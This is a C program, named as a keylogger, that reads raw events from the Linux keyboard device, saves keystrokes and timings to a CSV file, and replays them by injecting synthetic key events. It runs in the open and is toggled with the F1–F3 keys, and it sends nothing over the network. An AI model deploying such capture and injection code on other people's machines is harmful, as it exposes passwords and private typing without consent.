#include "keylogger.h"

void intHandler(int dummy) {
    printf("Killed [%d]\n", dummy);
    fflush(stdout);
    keepRunning = 0;
    saveToFile();
}

void saveToFile() {
    FILE * dump = fopen("./dump.csv", "w");
    for (int i = 0 ; i < count; i++) {
        sample toReg = samples[i];
        char * aSample = (char *) malloc(42 * sizeof(char));
        sprintf(aSample, "%011ld%09ld,%03d,%d\n", toReg.seconds, toReg.nsec, toReg.code, toReg.state);
        fwrite(aSample, sizeof(char), 27, dump);
    }
    fclose(dump);
}

void printSample(sample theSample) {
    const char * state = theSample.state == 2 ? "REPEATED" : (theSample.state == 1 ? "PRESSED " : "RELEASED");
    printf("%ld%09ld %03d %s\n", theSample.seconds, theSample.nsec, theSample.code, state);
}

void replaySamples() {
    struct timeval startTime;
    gettimeofday(&startTime, NULL);
    int sampleCount = 0;

    while (sampleCount < count) {
        struct timeval endTime;
        gettimeofday(&endTime, NULL);

        long int concat1 = (endTime.tv_sec * 1000000) + endTime.tv_usec;
        long int concat2 = (startTime.tv_sec * 1000000) + startTime.tv_usec;
        long int concat3 = (times[sampleCount].tv_sec * 1000000) + times[sampleCount].tv_usec;

        if (concat1 - concat2 > concat3) {
            sample keyEvt = samples[sampleCount];

            struct input_event forcedKey;

            forcedKey.type = EV_MSC;
            forcedKey.value = keyEvt.code;
            forcedKey.code = 16;
            gettimeofday(&forcedKey.time, NULL);
            write(kbdFile, &forcedKey, sizeof(struct input_event));

            forcedKey.type = EV_KEY;
            forcedKey.value = keyEvt.state;
            forcedKey.code = keyEvt.code;
            gettimeofday(&forcedKey.time, NULL);
            write(kbdFile, &forcedKey, sizeof(struct input_event));

            forcedKey.type = EV_SYN;
            forcedKey.value = 0;
            forcedKey.code = 0;
            gettimeofday(&forcedKey.time, NULL);
            write(kbdFile, &forcedKey, sizeof(struct input_event));

            gettimeofday(&startTime, NULL);
            sampleCount++;
        }
    }

    printf("Replay done\n");
}

int main() {
    struct input_event ev;
    struct timespec spec;
    struct timeval prevTime = {0, 0};

    int record = 0;

    kbdFile = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDWR);

    /* Binds the function intHandler to the Ctrl+C signal */
    signal(SIGINT, intHandler);

    /* Disables echo in console */
    struct termios termInfo;
    tcgetattr(0, &termInfo);
    termInfo.c_lflag &= ~ECHO;
    tcsetattr(0, 0, &termInfo);

    while(keepRunning) {
        read(kbdFile, &ev, sizeof (struct input_event));
        clock_gettime(CLOCK_REALTIME, &spec);

        if (ev.type == 1) {
            if (record == 1 && ev.code < KEY_F1) {
                if (count == 0 && ev.value == 0) {}
                else {
                    sample newSample = { ev.time.tv_sec, ev.time.tv_usec, ev.code, ev.value };
                    samples[count] = newSample;

                    struct timeval timeDiff;
                    if (count == 0) {
                        timeDiff.tv_sec = 0;
                        timeDiff.tv_usec = 0;
                    }
                    else {
                        timeDiff.tv_sec = ev.time.tv_sec - samples[count - 1].seconds;
                        timeDiff.tv_usec = ev.time.tv_usec - samples[count - 1].nsec;
                    }
                    times[count] = timeDiff;

                    //printSample(samples[count]);
                    count++;
                    if (count >= 2000) {
                        intHandler(1);
                    }
                }
                gettimeofday(&prevTime, NULL);
            }

            if (ev.code == 59 && ev.value == 1) {
                printf(record == 1 ? "Stopping " : "Starting ");
                printf("recording...\n");
                record = record == 1 ? 0 : 1;
                if (record == 0) {
                    saveToFile();
                }
            }

            if (ev.code == 60 && ev.value == 1) {
                printf("Replaying\n");
                replaySamples();
            }

            if (ev.code == 61 && ev.value == 1) {
                exit(0);
            }
        }
        fflush(stdout);
    }
}
